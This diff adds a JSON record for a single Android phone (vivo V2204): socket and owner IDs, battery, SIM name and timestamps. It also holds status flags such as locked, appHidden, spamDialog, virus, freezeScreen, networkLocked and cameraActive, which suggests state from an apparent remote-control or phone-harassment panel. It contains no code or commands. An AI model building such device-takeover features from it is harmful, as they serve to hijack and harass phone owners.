@@ -1,0 +1,40 @@
+{
+  "id": "86e41b1d5f0e45be",
+  "name": "V2204",
+  "socketId": "EnFveSDI1z-2aq1EAAA1",
+  "info": {
+    "sdk": 31,
+    "manufacturer": "vivo",
+    "model": "V2204",
+    "battery": 88,
+    "charging": false,
+    "sim": "ISAT-PEMILUDAMAI"
+  },
+  "connectedAt": "2026-10-27T00:46:47.500Z",
+  "lastSeen": "2026-10-27T00:46:47.500Z",
+  "ownerUid": "YCJI8J4L8H2P2DIZ",
+  "status": {
+    "flashlight": false,
+    "cameraActive": false,
+    "videoPlaying": false,
+    "wallpaperSet": false,
+    "locked": false,
+    "lockedV2": false,
+    "lockedChat": false,
+    "appHidden": false,
+    "activeTheme": "default",
+    "spamDialog": false,
+    "sos": false,
+    "virus": false,
+    "ambarus": false,
+    "networkLocked": false,
+    "freezeScreen": false,
+    "floatPhotos": false,
+    "autoWallpaper": false,
+    "screenColor": false,
+    "screenColorValue": ""
+  },
+  "accessibilityActive": false,
+  "accessibilityLastSeen": "2026-10-27T00:46:47.501Z",
+  "online": true
+}
